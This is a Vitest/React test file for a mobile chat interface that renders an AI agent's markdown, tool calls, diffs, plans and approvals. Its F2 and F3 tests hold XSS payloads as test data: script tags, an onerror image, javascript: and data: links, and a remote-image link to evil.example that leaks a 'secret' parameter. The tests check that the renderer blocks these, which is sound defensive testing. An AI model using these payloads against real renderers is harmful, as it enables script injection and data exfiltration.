import "@testing-library/jest-dom/vitest";
import { afterEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { useEffect, useRef } from "react";
import { MobileChatMessage } from "../MobileChatMessage";
import { ChatProseMarkdown } from "../MobileChatComponents";
import {
  ThreadFindProvider,
  useThreadFind,
  useThreadFindHotkey,
  countMatches,
  highlightMatches,
} from "./threadFind";
import { serializeTable, tableGridFromElement } from "./markdownTable";
import { formatCompactDiffCount } from "./diffStatLabel";
import { tailLines } from "./partKinds";
import { filterPartsForVisibility } from "./toolCallVisibility";
import { ProposedPlanCard } from "./planCard";
import { HtmlRenderFrame } from "./htmlRenderFrame";
import { ApprovalMoreOptionsMenu } from "./approvalMoreOptions";
import { resetAppearanceSettings, saveAppearanceSettings } from "../../../lib/appearanceSettings";
import type { ReferencePart } from "../referenceTypes";

afterEach(() => {
  cleanup();
  resetAppearanceSettings();
});

const tool = (id: string, status: "running" | "completed" | "failed"): ReferencePart => ({
  kind: "tool",
  name: "bash",
  summary: "",
  input: "ls",
  output: "out",
  status,
  id,
});

/* ------------------------------------------------------------------ *
 * F1  Code blocks: a fence is a block, and its language survives.
 * ------------------------------------------------------------------ */

describe("F1 code blocks", () => {
  it("draws a language-less fence as a block with copy and wrap", () => {
    render(<MobileChatMessage id="m" role="assistant" content={"```\nlet a = 1\n```"} />);
    expect(screen.queryByTestId("highlighted-code-lines")).not.toBeNull();
    expect(screen.getByRole("button", { name: "Copy code" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Wrap" })).toBeInTheDocument();
  });

  it("keeps a streaming unterminated fence a block and grows it in place", () => {
    const { rerender } = render(
      <MobileChatMessage id="m" role="assistant" content={"```ts\nconst a = 1;"} />,
    );
    expect(screen.getByRole("button", { name: "Copy code" })).toBeInTheDocument();
    expect(screen.getByTestId("highlighted-code-lines")).toHaveTextContent("const a = 1;");
    rerender(
      <MobileChatMessage id="m" role="assistant" content={"```ts\nconst a = 1;\nconst b = 2;"} />,
    );
    expect(screen.getByTestId("highlighted-code-lines")).toHaveTextContent("const b = 2;");
  });

  it("keeps the whole fence language, including the punctuation t3code keeps", () => {
    render(<MobileChatMessage id="m" role="assistant" content={"```c++\nint main() {}\n```"} />);
    // t3code extractFenceLanguage reads /language-([^\s]+)/ and shows "c++".
    // A /\w+/ read shows "c" and highlights C++ as C.
    expect(screen.queryByText("c++")).not.toBeNull();
  });

  it("marks the code frame ltr so an RTL thread does not mirror code", () => {
    const { container } = render(
      <MobileChatMessage id="m" role="assistant" content={"```ts\nconst a = 1;\n```"} />,
    );
    // t3code MarkdownCodeBlockFrame sets dir="ltr" on the frame.
    expect(container.querySelector('[dir="ltr"]')).not.toBeNull();
  });
});

/* ------------------------------------------------------------------ *
 * F2  Tables: alignment, size, and hostile cell text.
 * ------------------------------------------------------------------ */

describe("F2 tables", () => {
  it("copies a 400-row table without dropping rows", () => {
    const rows = Array.from({ length: 400 }, (_, index) => `| r${index} | ${index} |`);
    render(<ChatProseMarkdown text={["| name | n |", "| --- | --- |", ...rows].join("\n")} />);
    const grid = tableGridFromElement(document.querySelector("table"));
    expect(grid).not.toBeNull();
    expect(grid!.rows).toHaveLength(400);
    const csv = serializeTable(grid!, "csv");
    expect(csv.split("\n")).toHaveLength(401);
    expect(csv.split("\n")[400]).toBe("r399,399");
  });

  it("escapes markup in a cell instead of shipping it", () => {
    render(<ChatProseMarkdown text={"| x |\n| --- |\n| <script>alert(1)</script> |"} />);
    expect(document.querySelector("script")).toBeNull();
    const grid = tableGridFromElement(document.querySelector("table"));
    expect(serializeTable(grid!, "html")).toContain("&lt;script&gt;");
  });
});

/* ------------------------------------------------------------------ *
 * F3  Agent-authored markdown cannot execute or exfiltrate.
 * ------------------------------------------------------------------ */

describe("F3 markdown safety", () => {
  it("refuses raw HTML, javascript: links and remote images", () => {
    const hostile = [
      '<img src=x onerror="window.__g4=1">',
      "",
      "[bad](javascript:window.__g4=2)",
      "",
      "![remote](https://evil.example/p.png?d=secret)",
      "",
      "[data](data:text/html,<script>alert(1)</script>)",
    ].join("\n");
    render(<ChatProseMarkdown text={hostile} assistant />);
    expect(document.querySelector('img[src="x"]')).toBeNull();
    expect(document.querySelector('img[src^="https://evil.example"]')).toBeNull();
    for (const anchor of Array.from(document.querySelectorAll("a"))) {
      const href = anchor.getAttribute("href") ?? "";
      expect(href.startsWith("javascript:")).toBe(false);
      expect(href.startsWith("data:")).toBe(false);
    }
    expect((window as unknown as { __g4?: number }).__g4).toBeUndefined();
  });

  it("routes external links through onOpenExternal and file links never get an href", () => {
    const onOpenExternal = vi.fn();
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content={"[docs](https://example.com/a)\n\n[local](ui/src/a.ts:12)"}
        onOpenExternal={onOpenExternal}
      />,
    );
    fireEvent.click(screen.getByTestId("markdown-external-link"));
    expect(onOpenExternal).toHaveBeenCalledWith("https://example.com/a");
    const fileLink = screen.getByTestId("markdown-file-link");
    expect(fileLink.getAttribute("href")).toBeNull();
    expect(fileLink).toHaveAttribute("data-path", "ui/src/a.ts");
    expect(fileLink).toHaveAttribute("data-line", "12");
  });

  it("does not turn an in-page anchor into a file link", () => {
    render(<ChatProseMarkdown text={"[jump](#the-section)"} assistant />);
    expect(screen.queryByTestId("markdown-file-link")).toBeNull();
  });
});

/* ------------------------------------------------------------------ *
 * F4  Find in thread: counts must track the transcript.
 * ------------------------------------------------------------------ */

function OpenFind({ query }: { query: string }) {
  const find = useThreadFind();
  const opened = useRef(false);
  useThreadFindHotkey(find);
  useEffect(() => {
    if (opened.current || !find) return;
    opened.current = true;
    find.openFind(query);
  }, [find, query]);
  return null;
}

function Thread({ ids, query }: { ids: readonly string[]; query: string }) {
  return (
    <ThreadFindProvider>
      <OpenFind query={query} />
      {ids.map((id) => (
        <MobileChatMessage key={id} id={id} role="assistant" content={`alpha ${id}`} />
      ))}
    </ThreadFindProvider>
  );
}

describe("F4 find in thread", () => {
  it("drops the matches of a message that leaves the transcript", async () => {
    const { rerender } = render(<Thread ids={["a", "b"]} query="alpha" />);
    await waitFor(() => expect(screen.getByTestId("thread-find-count")).toHaveTextContent("1/2"));
    rerender(<Thread ids={["a"]} query="alpha" />);
    await waitFor(() => expect(screen.getByTestId("thread-find-count")).toHaveTextContent("1/1"));
  });

  it("counts Korean and regex-metacharacter queries literally", () => {
    expect(countMatches("안녕하세요 안녕", "안녕")).toBe(2);
    expect(countMatches("a.b a.b axb", "a.b")).toBe(2);
    expect(countMatches("C++ and C++", "C++")).toBe(2);
    // One mark plus the trailing text: two nodes, one of them the match.
    const nodes = highlightMatches("C++ rocks", "C++", "m", 0, null);
    expect(nodes).toHaveLength(2);
    expect(countMatches("C++ rocks", "C++")).toBe(1);
  });

  it("counts 10k matches in one message without dropping any", () => {
    const text = Array.from({ length: 10_000 }, () => "token").join(" ");
    expect(countMatches(text, "token")).toBe(10_000);
  });
});

/* ------------------------------------------------------------------ *
 * F5  Tool call visibility.
 * ------------------------------------------------------------------ */

describe("F5 tool call visibility", () => {
  it("keeps a running and a failed call, drops a finished one", () => {
    const parts = [tool("run", "running"), tool("ok", "completed"), tool("bad", "failed")];
    const kept = filterPartsForVisibility(parts, "hide-successful");
    expect(kept.map((part) => (part.kind === "tool" ? part.id : null))).toEqual(["run", "bad"]);
    // hide-all still keeps the failure: activity-log.md, errors always show.
    const hidden = filterPartsForVisibility(parts, "hide-all");
    expect(hidden.map((part) => (part.kind === "tool" ? part.id : null))).toEqual(["bad"]);
  });

  it("renders only the failure at hide-all", () => {
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content=""
        referenceParts={[tool("ok", "completed"), tool("bad", "failed")]}
        toolCallVisibility="hide-all"
      />,
    );
    const rows = screen.getAllByTestId("reference-tool-part");
    expect(rows).toHaveLength(1);
    expect(rows[0]).toHaveTextContent("failed");
  });

  it("zen hides an in-between reply and keeps the final one", () => {
    const { unmount } = render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content="halfway note"
        toolCallVisibility="zen"
        isTurnFinalReply={false}
      />,
    );
    expect(screen.queryByTestId("assistant-message-body")).toBeNull();
    unmount();
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content="the answer"
        toolCallVisibility="zen"
        isTurnFinalReply
      />,
    );
    expect(screen.getByTestId("assistant-message-body")).toHaveTextContent("the answer");
  });
});

/* ------------------------------------------------------------------ *
 * F6  Diff stats and live tails.
 * ------------------------------------------------------------------ */

describe("F6 diff stats and live output", () => {
  it("compacts counts the way the reference does", () => {
    expect(formatCompactDiffCount(0)).toBe("0");
    expect(formatCompactDiffCount(999)).toBe("999");
    expect(formatCompactDiffCount(1000)).toBe("1k");
    expect(formatCompactDiffCount(1234)).toBe("1.2k");
    expect(formatCompactDiffCount(1_000_000)).toBe("1m");
  });

  it("tails a long running output and keeps the whole finished one", () => {
    const output = Array.from({ length: 100 }, (_, index) => `line ${index}`).join("\n");
    expect(tailLines(output).split("\n")).toHaveLength(40);
    expect(tailLines(output).split("\n")[39]).toBe("line 99");
    expect(tailLines("short")).toBe("short");
  });

  it("shows the tail while running and the whole output once done", () => {
    const output = Array.from({ length: 100 }, (_, index) => `line ${index}`).join("\n");
    const { rerender } = render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content=""
        referenceParts={[{ ...tool("t", "running"), output } as ReferencePart]}
      />,
    );
    fireEvent.click(screen.getByTestId("work-row"));
    const live = screen.getByTestId("reference-tool-output");
    expect(live).toHaveTextContent("line 99");
    expect(live).not.toHaveTextContent("line 10\nline 11");
    rerender(
      <MobileChatMessage
        id="m"
        role="assistant"
        content=""
        referenceParts={[{ ...tool("t", "completed"), output } as ReferencePart]}
      />,
    );
    // The drawer stays open across the status change; the finished call keeps everything.
    expect(screen.getByTestId("reference-tool-output")).toHaveTextContent("line 0");
  });
});

/* ------------------------------------------------------------------ *
 * F7  Copy takes the prose, not the scaffolding.
 * ------------------------------------------------------------------ */

describe("F7 copy", () => {
  it("copies only the text parts of a turn that also has tools and a diff", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content=""
        referenceParts={[
          { kind: "text", text: "첫 문단" },
          tool("t", "completed"),
          { kind: "diff", patch: { ref: "p", byteLength: 4, digest: "d", truncated: false } },
          { kind: "text", text: "둘째 문단" },
        ]}
      />,
    );
    fireEvent.click(screen.getByTestId("message-copy-button"));
    await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith("첫 문단\n\n둘째 문단"));
  });

  it("copies a Korean + RTL user message byte for byte", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    const text = "터미널 출력을 확인해 주세요. RTL: مرحبا";
    render(<MobileChatMessage id="u" role="user" content={text} />);
    fireEvent.click(screen.getByTestId("message-copy-button"));
    await vi.waitFor(() => expect(writeText).toHaveBeenCalledWith(text));
  });
});

/* ------------------------------------------------------------------ *
 * F8  Plan card and visual reply.
 * ------------------------------------------------------------------ */

describe("F8 plan card and html render", () => {
  it("does not repeat the plan title inside the collapsed preview", () => {
    const plan = ["# Ship it", "", ...Array.from({ length: 24 }, (_, i) => `- step ${i}`)].join("\n");
    render(<ProposedPlanCard planMarkdown={plan} />);
    const card = screen.getByTestId("proposed-plan-card");
    // The title is already the card's heading; t3code strips it from the body
    // (stripDisplayedPlanMarkdown) so the plan does not say its name twice.
    expect(card.textContent).not.toContain("# Ship it");
    expect(screen.getByRole("heading", { level: 3 })).toHaveTextContent("Ship it");
  });

  it("sandboxes a visual reply without same-origin", () => {
    render(<HtmlRenderFrame html={"<p>hi</p>"} />);
    const frame = screen.getByTestId("html-render-iframe") as HTMLIFrameElement;
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
    expect(frame.getAttribute("sandbox")).not.toContain("allow-same-origin");
    expect(frame.getAttribute("srcdoc")).toBe("<p>hi</p>");
  });
});

/* ------------------------------------------------------------------ *
 * F9  Approval extras.
 * ------------------------------------------------------------------ */

describe("F9 approval extras", () => {
  it("offers Cancel and Always allow behind one menu, warning reachable", () => {
    const onChoose = vi.fn();
    render(<ApprovalMoreOptionsMenu onChoose={onChoose} />);
    fireEvent.click(screen.getByTestId("approval-more-options"));
    expect(screen.getByTestId("approval-option-cancel")).toBeInTheDocument();
    const always = screen.getByTestId("approval-option-acceptForSession");
    // The warning must reach a screen reader; t3code also shows it as a tooltip.
    expect(always.getAttribute("aria-description") ?? "").toContain("without asking again");
    fireEvent.click(always);
    expect(onChoose).toHaveBeenCalledWith("acceptForSession", expect.anything());
  });
});

/* ------------------------------------------------------------------ *
 * F10 Markdown must survive the math setting being off.
 * ------------------------------------------------------------------ */

describe("F10 math off", () => {
  it("still renders markdown when math rendering is disabled", () => {
    act(() => {
      saveAppearanceSettings({ renderMath: false });
    });
    const { container } = render(<ChatProseMarkdown text={"**bold** and $x$"} assistant />);
    expect(container.querySelector("strong")).not.toBeNull();
    expect(container.textContent).toContain("$x$");
  });

  it("still draws a code block in a message that also mentions a dollar sign", () => {
    act(() => {
      saveAppearanceSettings({ renderMath: false });
    });
    render(
      <MobileChatMessage id="m" role="assistant" content={"Cost is $5\n\n```ts\nconst a = 1;\n```"} />,
    );
    expect(screen.queryByTestId("highlighted-code-lines")).not.toBeNull();
  });

  it("does not read a price as math when math rendering is on", () => {
    const { container } = render(
      <ChatProseMarkdown text={"It costs $5 and $10 total."} assistant />,
    );
    // /\$[^$]+\$/ matches "$5 and $", so the two prices become one formula.
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("$5 and $10");
  });
});

/* ------------------------------------------------------------------ *
 * F11 The turn's end is announced.
 * ------------------------------------------------------------------ */

describe("F11 announcements", () => {
  it("says the turn ended once the turn is idle", () => {
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content="all done"
        announceLevel="status-only"
        activityState="idle"
      />,
    );
    // activity-log.md: status only "says when a turn starts, needs your approval or
    // input, and ends"; the reader is told to read the reply after hearing Done.
    const region = screen.queryByTestId("thread-announcer");
    expect(region).not.toBeNull();
    expect(region!.textContent ?? "").toMatch(/done/i);
  });

  it("reads a running turn's status", () => {
    render(
      <MobileChatMessage
        id="m"
        role="assistant"
        content=""
        announceLevel="status-only"
        activityState="running_tool"
      />,
    );
    expect(screen.getByTestId("thread-announcer")).toHaveTextContent("Working");
  });
});
